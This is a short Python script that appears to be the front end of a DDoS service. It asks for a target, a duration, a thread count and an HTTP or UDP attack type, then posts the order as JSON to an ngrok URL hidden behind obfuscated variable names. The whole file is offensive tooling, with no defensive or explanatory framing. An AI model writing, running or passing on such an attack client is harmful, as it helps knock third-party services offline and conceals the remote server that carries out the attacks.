import urllib.request, urllib.error, urllib.parse
import sys
import threading
import random
import re
import time
import math
from colorama import Fore, init
import os
import requests

colors = [
    Fore.LIGHTGREEN_EX,
    Fore.LIGHTYELLOW_EX,
    Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX,
    Fore.LIGHTRED_EX,
    Fore.LIGHTBLUE_EX,
    Fore.RED
]

gussini = """                                                                                                                                                                        
                .-**********+.      .=*******-    -*******+.   :+**************..+*******=        :+******=    .+****-      =**     -*******+      -********:                     
                **-        +**+    +**=    .**= .**+     -**-:**+   .**+      :**=     .***:    :***    .***- +*+  ***      +*+   -**+.    +*+   +**:     =**+                    
                   +*+      -**:  :**+      +*= -**:      **-=*=    :**-     =*=  =**   .**-   -**-       +**-+.  .**+     .**=   ***      =*+  **:  +*-   ***                    
                  :**-      .**=   +**=         :***:        :*+.   +**.    -*+  .**+   +**:  :**+        -**:    -**:     +**-   -**+.        +*.  -**:  :**=                    
                  =**.      .**=   :=****+        -****+=           **+     =*-  -**::=**=    =**.        -**:    =*+     -***.   .=*****     :*+   +**:-+**:                     
                  **+       -**: -**+                .=+**+.       :**=     **. +*****+.      =**         +*+.   .**=    :****  .**+.         -*- :******=                        
                 :**-      -**+ .**+             ,=      .**=      +**      +*:  **+ .***.    =**:       =**-    .**+   +*.**=  ***           -*=  -**. +**=                      
                 +**.    .+**-   ***-        :- *=      -**-       +**      -*+ .**=  :***.  :+***:     =**:      -*****= :**+*****=        .:=**. +*+   +**=   =*.               
                 **********-      +**********    *********:       :**+       =*****     ******- -********=             -*****.   -*************-+****-    =******.                
                  ..:::.              .:::..       .::.            .:          .:.        ::       .::.             :**-. +*=        .::::.       .:        .:.                   
                                                                                                                   +*-   :**:                                                     
                                                                                                                  :**:  -**:                                                      
                                                                                                                   '*****"`                                                       
                                                                                                                                                                             
"""
def main():
    print(Fore.GREEN + gussini)
    in1 = input(colors[6] + "Target: ")
    in2 = input(colors[6] + "Duration: ")
    in3 = input(colors[6] + "Threads: ")
    in4 = input(colors[6] + "Type [1 = HTTP ATTCK, 2 = UDP ATTCK]: ")

    print(in1)
    print(in2)
    print(in3)
    print(in4)

    target = in1 
    duration = in2
    threads = in3
    type1or2 = in4
    dEBnjpfjvDEWZTTAyauZThUKJiyYXUsJycceGkswbumKrcByespvjRcGAayAFZuxCuwmeGyYXERNmRsnomwXusEBWpTtVsxMGQoa = "https://32797fa7b50a.ngrok-free.app/"
    UAWwkCLAxFBdHLiBYbtsdoqJZVkAAUCCgLgTNuswUGRkxjAmYgvWPhyPaXcAMFTByuVozrjKmhogdLuhNFvXjQMavaxZNZojaGvb = "BYRhyHdHZMkxgeGBrcmKvYoAQsmeOjTRJPhMwtpPoJozgQqPNPisGAlCkueBFcvbHDtdJJypigXmIEnzBrlfSXAiyYMlXCkC"
    JUHDJfeBgZAKpQEzuKRnBBHLdUuJufRkqEVCTmKevxLsZDaioiCULwQyixjgTotMJMGfPZroxXyswTJKcXwBmEnnkMJqpmBgtZJW = "guxcFmuHhgaIkyGMCPsgrsFubdXwWFZSSJiojZtTlkNsLcFDneHwNZlfPbriWpLtssyhlmKklwQqOckglUmDfOuHTnWscQjOySDTNBLSYJZqpRqrBDGQicVfpSWwhoLHPevsgWVKIBTOZfiuCpiPQbRJuqUHClYwcUFNQWVpGtjIVUgoOMOinlxWDMnZrUZmojSGZbZBJTDcxUpXPuoADdTDhIvASBEwelIVtKkfXuYkbbitHzQPitBPQYCcxduraWtRwWowNZOjRbSIluVafIseqBpvzwKAXSpybcCksBIZwWOCojShgItMNECzVUrlpLvwnGELnzZmFxjnXQwgLLWpgsASecVelPmBBRA"
    jCwpdNbXACLXLNPafzFmdVyxVUGBxZdozYsxXoPvBRPddHosUDPRCxdmMhmXPQfyRDuUYZXcYTTzQaKYEUPonrLEwYBWCAPiCsFW = "AdOEGObtDkdKRcnkjOwyCeIqCquvcOzfAHnUFUkYxsBmU"

    url = f'{dEBnjpfjvDEWZTTAyauZThUKJiyYXUsJycceGkswbumKrcByespvjRcGAayAFZuxCuwmeGyYXERNmRsnomwXusEBWpTtVsxMGQoa + UAWwkCLAxFBdHLiBYbtsdoqJZVkAAUCCgLgTNuswUGRkxjAmYgvWPhyPaXcAMFTByuVozrjKmhogdLuhNFvXjQMavaxZNZojaGvb + JUHDJfeBgZAKpQEzuKRnBBHLdUuJufRkqEVCTmKevxLsZDaioiCULwQyixjgTotMJMGfPZroxXyswTJKcXwBmEnnkMJqpmBgtZJW + jCwpdNbXACLXLNPafzFmdVyxVUGBxZdozYsxXoPvBRPddHosUDPRCxdmMhmXPQfyRDuUYZXcYTTzQaKYEUPonrLEwYBWCAPiCsFW}'
    myobj = {
        "target": target,
        "duration": duration,
        "threads": threads,
        "type": type1or2
    }
    x = requests.post(url, json = myobj)
    print("[debug] Status Code:", x.status_code)
    print("[debug] Response:", x.text)

main()

